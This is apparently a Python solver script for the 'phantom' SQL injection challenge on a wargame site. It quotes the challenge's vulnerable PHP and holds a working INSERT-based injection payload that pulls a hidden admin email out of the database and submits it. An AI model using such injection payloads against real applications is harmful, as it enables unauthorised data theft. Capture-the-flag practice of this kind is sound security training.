#!/usr/bin/env python3
import pickle
import los
from getpass import getpass
from bs4 import BeautifulSoup
import re


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'config' in args[0]


def main():
    '''
    Phantom

    if($_GET['joinmail']){
      if(preg_match('/duplicate/i', $_GET['joinmail'])) exit("nice try");
      $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
      mysqli_query($db,$query);
      echo "<hr>query : <strong>{$query}</strong><hr>";
    }

    $rows = mysqli_query($db,"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
    echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
      while(($result = mysqli_fetch_array($rows))){
      if($result['no'] == 1) $result['email'] = "**************";
      echo "<tr><td>{$result[ip]}</td><td>".htmlentities($result[email])."</td></tr>";
    }
    echo "</table>";

    $_GET[email] = addslashes($_GET[email]);
    $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['email']) && ($result['email'] === $_GET['email'])){ mysqli_query($db,"delete from prob_phantom where no != 1"); solve("phantom"); }
    '''

    url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    ip = los.get_request('http://ifconfig.me/ip', param={})
    print(ip)

    payload = f"test'), (8, '{ip}', (select email from prob_phantom tmp where no=1))#"
    param = dict(joinmail=payload)
    response = los.get_request(url, param, cook)

    soup = BeautifulSoup(response.replace(
        '<td>', '').replace('</td>', ''), 'html.parser')
    mail = soup.find_all(string=re.compile(ip))

    param = {'email': mail[1].replace(ip, '')}
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Phantom Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
